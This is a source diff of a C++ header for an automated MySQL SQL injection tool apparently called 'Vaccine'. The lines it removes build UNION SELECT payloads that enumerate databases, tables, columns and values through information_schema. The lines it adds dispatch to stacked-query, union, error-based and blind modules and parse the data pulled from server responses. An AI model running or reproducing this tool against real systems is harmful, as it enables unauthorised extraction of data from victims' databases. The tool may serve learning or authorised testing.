@@ -1,50 +1,54 @@
 #ifndef SQLI_MYSQL
 #define SQLI_MYSQL
 
-#include "Vaccine.hpp"
+#define STACKED 0
+#define UNION 1
+#define ERROR 2
+#define BLIND 3
+
+#include "blind_based.hpp"
+#include "error_based.hpp"
+#include "stacked_queries.hpp"
+#include "union_based.hpp"
 
 struct sqli_mysql
 {
-        inline static const str_vector _excluded = {
+        inline static const str_vector excluded = {
             "information_schema",
             "mysql",
             "performance_schema",
             "sys",
         };
 
-        // =========================================== UNION BASED PAYLOADS
-        static std::string union_based_db_payload(const sptr_vector params)
+        static std::string payload(
+            sptr_vector& config,
+            const uint8& method_type,
+            const uint8& value_type)
         {
-                const std::string offset = *params[0];
-                *params[0] += "null, ";
-                return "' UNION SELECT " + offset + "schema_name " +
-                       "FROM information_schema.schemata-- ";
+                switch (method_type)
+                {
+                case STACKED:
+                        return mysql_stacked_queries::payload(config, value_type);
+                case UNION:
+                        return mysql_union_based::payload(config, value_type);
+                case ERROR:
+                        return mysql_error_based::payload(config, value_type);
+                case BLIND:
+                        return mysql_blind_based::payload(config, value_type);
+                default:
+                        return std::string();
+                }
         };
 
-        static std::string union_based_tab_payload(const sptr_vector params)
+        static str_vector parser(
+            const std::string& response,
+            sptr_vector& config,
+            const uint8& method_type,
+            const uint8& value_type)
         {
-                return "' UNION SELECT " + *params[0] + "table_name " +
-                       "FROM information_schema.tables " +
-                       "WHERE table_schema='" + *params[1] + "'-- ";
-        };
-
-        static std::string union_based_col_payload(const sptr_vector params)
-        {
-                return "' UNION SELECT " + *params[1] + "column_name " +
-                       "FROM information_schema.columns " +
-                       "WHERE table_schema='" + *params[2] + "' " +
-                       "AND table_name='" + *params[0] + "'-- ";
-        };
-
-        static std::string union_based_val_payload(const sptr_vector params)
-        {
-                return "' UNION SELECT " + *params[2] + *params[1] + " " +
-                       "FROM " + *params[3] + "." + *params[0] + "-- ";
-        };
-
-        // =========================================== UNION BASED PARSER
-        static str_vector union_based_parser(const std::string& response)
-        {
+                (void)value_type;
+                if (method_type == BLIND)
+                        return mysql_blind_based::parser(response, config);
                 str_vector values;
                 Json::Value entries;
                 std::string errors;
@@ -53,32 +57,37 @@ struct sqli_mysql
                 if (!reader->parse(
                         response.c_str(),
                         response.c_str() + response.size(),
-                        &entries,
-                        &errors))
+                        &entries, &errors))
                 {
                         std::cerr << "[ ERROR ] Could not parse server response."
                                   << std::endl;
-                        return values;
+                        return str_vector();
                 }
+                if (method_type == ERROR)
+                        return mysql_error_based::parser(entries, config);
+
                 for (const auto& member : entries.getMemberNames())
                 {
                         if (!entries[member].isArray())
                                 continue;
                         if (entries[member].empty())
-                                values.push_back(std::string());
+                                return str_vector();
 
+                        if (method_type == STACKED)
+                                return mysql_stacked_queries::parser(entries, member);
+
+                        std::string entry_str;
                         for (const auto& entry : entries[member])
                         {
                                 for (const auto& key : entry.getMemberNames())
                                 {
                                         if (entry[key].isNull())
                                                 continue;
-                                        std::string entry_str;
                                         try
                                         {
                                                 entry_str = entry[key].asString();
                                         }
-                                        catch (const std::exception& e)
+                                        catch (const std::exception& _)
                                         {
                                                 entry_str = "NOT_CONVERTIBLE";
                                         }
